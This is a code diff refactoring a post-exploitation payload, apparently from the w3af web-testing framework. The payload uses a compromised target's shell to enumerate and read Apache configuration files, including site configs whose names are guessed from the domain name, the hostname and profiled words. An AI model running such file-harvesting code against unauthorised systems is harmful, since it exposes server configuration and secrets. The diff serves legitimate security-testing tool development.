@@ -1,16 +1,13 @@
-import core.data.kb.knowledgeBase as kb
-import plugins.attack.payloads.misc.file_crawler as file_crawler
-from plugins.attack.payloads.base_payload import base_payload
-from core.ui.consoleUi.tables import table
+import core.data.kb.knowledge_base as kb
+from plugins.attack.payloads.base_payload import Payload
+from core.ui.console.tables import table
 
 
-class apache_config_files(base_payload):
+class apache_config_files(Payload):
     '''
     This payload finds readable Apache configuration files
     '''
-    def api_read(self, parameters):
-        result = {}
-        result['apache_config'] = {}
+    def fname_generator(self, apache_dir):
         files = []
 
         files.append('apache2.conf')
@@ -24,19 +21,16 @@ class apache_config_files(base_payload):
         files.append('conf.d/subversion.conf')
         files.append('workers.properties')
 
-        apache_dir = self.exec_payload('apache_config_directory')['apache_directory']
         if apache_dir:
-            for dir in apache_dir:
-                for file in files:
-                    content = self.shell.read(dir+file)
-                    if content:
-                        result['apache_config'][ dir+file ] = content
-                
-                #TODO: Add target domain name being scanned by w3af.
-                profiled_words_list = kb.kb.getData('passwordProfiling', 'passwordProfiling')
+            for directory in apache_dir:
+                for filename in files:
+                    yield directory + filename
+
+                profiled_words_list = kb.kb.raw_read('password_profiling',
+                                                     'password_profiling')
                 domain_name = self.exec_payload('domainname')['domain_name']
                 hostname = self.exec_payload('hostname')['hostname']
-                
+
                 extras = []
                 extras.append(domain_name)
                 extras.extend(hostname)
@@ -44,28 +38,38 @@ class apache_config_files(base_payload):
                     extras.extend(profiled_words_list)
                 extras = list(set(extras))
                 extras = [i for i in extras if i != '']
-                
+
                 for possible_domain in extras:
-                    site_configuration = dir + 'sites-enabled/' + possible_domain.lower()
-                    
-                    site_configuration_content = self.shell.read(site_configuration)
-                    if site_configuration_content:
-                        result['apache_config'][ site_configuration ] = site_configuration_content
+                    yield directory + 'sites-enabled/' + possible_domain.lower()
+
+                yield directory + 'sites-enabled/' + self.shell.get_url().get_domain()
+
+    def api_read(self):
+        result = {}
+        result['apache_config'] = {}
+
+        apache_dirs = self.exec_payload(
+            'apache_config_directory')['apache_directory']
+        fname_iter = self.fname_generator(apache_dirs)
+
+        for file_path, content in self.read_multi(fname_iter):
+            if content:
+                result['apache_config'][file_path] = content
 
         return result
-        
-    def run_read(self, parameters):
-        api_result = self.api_read( parameters )
-        
+
+    def run_read(self):
+        api_result = self.api_read()
+
         if not api_result['apache_config']:
             return 'Apache configuration files not found.'
         else:
             rows = []
-            rows.append( ['Apache configuration files'] ) 
-            rows.append( [] )
+            rows.append(['Apache configuration files'])
+            rows.append([])
             for key_name in api_result:
                 for filename, file_content in api_result[key_name].items():
-                    rows.append( [filename,] )
-            result_table = table( rows )
-            result_table.draw( 80 )                    
+                    rows.append([filename, ])
+            result_table = table(rows)
+            result_table.draw(80)
             return rows
